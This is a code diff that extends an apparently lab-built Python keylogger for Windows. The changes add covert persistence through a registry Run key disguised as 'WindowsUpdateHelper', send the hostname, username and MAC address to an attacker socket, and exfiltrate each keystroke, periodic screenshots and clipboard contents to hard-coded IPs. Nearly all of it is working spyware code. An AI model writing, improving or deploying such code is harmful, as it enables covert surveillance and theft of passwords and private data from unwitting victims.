@@ -1,3 +1,10 @@
+import getpass
+import os
+import platform
+import sys
+import uuid
+from venv import logger
+import winreg
 from pynput import keyboard
 import win32gui
 from datetime import datetime
@@ -14,6 +21,13 @@ log_data = {}
 previous_clipboard = ""
 
 sock = None
+try:
+    import win32gui
+    import win32clipboard
+    WIN32_AVAILABLE = True
+except ImportError:
+    print("Warning: pywin32 not found. Some features (window title, clipboard) disabled.")
+    WIN32_AVAILABLE = False
 
 def connect_to_attacker(ip, port):
     global sock
@@ -21,6 +35,9 @@ def connect_to_attacker(ip, port):
     try:
         sock.connect((ip, port))
         print(f"[+] Connecté à l'attaquant {ip}:{port}")
+        system_info = get_system_information()
+        envoyer_log(system_info)
+        print("[+] Informations système envoyées.")
     except Exception as e:
         print(f"[-] Échec connexion à l'attaquant : {e}")
         sock = None
@@ -29,20 +46,31 @@ def connect_to_attacker(ip, port):
 def envoyer_image(img_data, filename):
     global sock
     if sock is None:
-        print("[-] Pas connecté, image non envoyée.")
+        print("[-] No connection, image not sent")
         return
-
+    
     try:
-        # Envoyer un header simple avec le nom et la taille (longueur)
-        header = f"IMAGE|{filename}|{len(img_data)}".encode()
-        sock.sendall(header + b"\n")
-
-        # Envoyer l'image en bytes
-        sock.sendall(img_data)
-        print(f"[+] Image envoyée : {filename}")
+        # Send header with newline
+        header = f"IMAGE|{filename}|{len(img_data)}\n".encode('utf-8')
+        sock.sendall(header)
+        print(f"[📸] Sent header for {filename} ({len(img_data)} bytes)")
+        
+        # Send image data in chunks
+        total_sent = 0
+        chunk_size = 4096
+        while total_sent < len(img_data):
+            chunk = img_data[total_sent:total_sent+chunk_size]
+            sent = sock.send(chunk)
+            if sent == 0:
+                raise RuntimeError("Socket connection broken")
+            total_sent += sent
+            print(f"[📸] Sent {total_sent}/{len(img_data)} bytes")
+            
+        print(f"[✅] Successfully sent {filename}")
     except Exception as e:
-        print(f"Erreur envoi image : {e}")
-
+        print(f"[❌] Error sending image: {e}")
+        # Attempt to reconnect
+        connect_to_attacker("192.168.56.102", 9999)
 def envoyer_log(message):
     global sock
     if sock is None:
@@ -100,12 +128,16 @@ def surveiller_presse_papier():
         time.sleep(0.5)
 
 def get_active_window_title():
+    """Gets the title of the currently active window."""
+    if not WIN32_AVAILABLE:
+        return "[Win32 API Unavailable]"
     try:
-        window = win32gui.GetForegroundWindow()
-        return win32gui.GetWindowText(window)
-    except:
-        return "Fenêtre inconnue"
-
+        hwnd = win32gui.GetForegroundWindow()
+        title = win32gui.GetWindowText(hwnd)
+        return title if title else "[No Title]"
+    except Exception as e:
+        logger.error(f"Error getting active window title: {e}")
+        return f"[Error: {e}]"
 def on_press(key):
     global current_window, log_data
 
@@ -143,9 +175,49 @@ def on_press(key):
             char = f"[{key.name}]"
 
     log_data[current_window][1].append(char)
-    print(f"{now} | {current_window} > {char}")
+    envoyer_touche_immediatement(current_window, char)
+def add_registry_persistence():
+    """
+    Adds the script to Windows startup via HKCU\Run registry key.
+    Name: 'WindowsUpdateHelper' (looks legit)
+    """
+    try:
+        # Get the full path to the current script
+        script_path = os.path.abspath(__file__)
+        # Use the same Python executable that's running this script
+        python_exe = sys.executable
+        # Command: "python.exe" "C:\full\path\to\keylogger.py"
+        command = f'"{python_exe}" "{script_path}"'
 
+        # Open the Run key under HKEY_CURRENT_USER
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        # Set the value
+        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, command)
+        winreg.CloseKey(key)
 
+        print("[+] Persistence added to registry: WindowsUpdateHelper")
+    except Exception as e:
+        print(f"[-] Failed to add registry persistence: {e}")
+def get_system_information():
+    """
+    Returns a formatted string with system info.
+    """
+    try:
+        info = {
+            "Hostname": platform.node(),
+            "OS": f"{platform.system()} {platform.release()}",
+            "Architecture": platform.machine(),
+            "Username": getpass.getuser(),
+            "UID (MAC-based)": ":".join(f"{uuid.getnode():012x}"[i:i+2] for i in range(0, 12, 2))
+        }
+        return "[SYSTEM_INFO]\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])
+    except Exception as e:
+        return f"[SYSTEM_INFO_ERROR: {e}]"
 def envoyer_logs_periodiquement():
     while True:
         try:
@@ -170,17 +242,33 @@ def envoyer_logs_periodiquement():
             print(f"[!] Erreur lors de l'envoi périodique : {e}")
 
         time.sleep(10)  # sommeil fixe entre chaque envoi
-# Lancer le keylogger
+def envoyer_touche_immediatement(window, char):
+    """Send a single keystroke immediately."""
+    now = datetime.now().strftime('%H:%M:%S')
+    message = f"[{now}] {window} > {char}"
+    envoyer_log(message)
+def screenshot_thread():
+    while True:
+        time.sleep(30)  
+        window_title = get_active_window_title()
+        print(f"[📸] Periodic screenshot of: {window_title}")
+        capture_ecran(window_title)
+
+
 if __name__ == "__main__":
     # Connexion à l'attaquant
-    connect_to_attacker("10.0.2.4", 4444)
+    add_registry_persistence()
+
+    connect_to_attacker("192.168.56.102", 9999)
+    screenshot_t = threading.Thread(target=screenshot_thread, daemon=True)
+    screenshot_t.start()
 
     # Lancement des threads en arrière-plan
     clipboard_thread = threading.Thread(target=surveiller_presse_papier, daemon=True)
     clipboard_thread.start()
 
-    log_thread = threading.Thread(target=envoyer_logs_periodiquement, daemon=True)
-    log_thread.start()
+    #log_thread = threading.Thread(target=envoyer_logs_periodiquement, daemon=True)
+    #log_thread.start()
 
     # Lancement du keylogger principal
     try:
